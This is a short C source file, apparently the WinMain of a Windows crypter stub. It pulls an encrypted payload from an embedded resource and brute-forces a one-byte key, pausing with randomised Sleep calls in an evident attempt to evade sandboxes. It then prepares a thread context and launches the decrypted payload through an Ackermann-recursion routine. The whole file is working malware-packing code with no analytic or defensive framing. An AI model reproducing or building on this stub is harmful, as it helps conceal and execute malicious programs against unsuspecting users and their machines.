#include "utils.h"
#include "stub_PE.h"
#include "exec.h"
#include "stub_crypto.h"
#include <time.h>

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	HANDLE hFile;
	DWORD dwFileSize;
	DWORD dwBytesRead;
	DWORD dwPayloadSize;
	HRSRC hRsrc;
	HGLOBAL hGlob;
	LPBYTE lpRes;
	BYTE bKey;
	int i;

	if(!FillApi()) 
		return 1;

	init();

	srand((unsigned int) time(NULL));

	ZeroMemory(szProcessName, MAX_PATH);
	fGetModFname(NULL, szProcessName, MAX_PATH);
	DebugPrintA("I am %s\n", szProcessName);
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;

	hRsrc = FindResourceA(NULL, MAKEINTRESOURCEA(150), RT_RCDATA);

	DebugPrintA("found resource! lets go!");
	dwPayloadSize = SizeofResource(NULL, hRsrc);
	
	hGlob = LoadResource(NULL, hRsrc);
	
	lpRes = (LPBYTE) LockResource(hGlob);
	lpBuffer = (LPBYTE) malloc(dwPayloadSize*sizeof(BYTE));
	memcpy(lpBuffer, lpRes, dwPayloadSize);
	
	if(strlen(lpCmdLine) > 0) {
		strcat_s(szProcessName, MAX_PATH, " ");
		strcat_s(szProcessName, MAX_PATH, lpCmdLine);
	}

	lpCopy = (LPBYTE) malloc(dwPayloadSize * sizeof(BYTE));
	bKey = 1;

	while(1){
		Decrypt(&bKey, lpBuffer, lpCopy, dwPayloadSize);
		if(Validate(lpCopy) == TRUE) 
			break;
		bKey++;
		Sleep(bKey % rand());
	}
	
	DebugPrintA("recursing");
	Ackermann(1, UPPER, lpCopy);
	
	DebugPrintA("Ok, we done!");
	free(lpCopy);
	free(lpBuffer);
	DebugPrintA("bye...");
	return 0;
}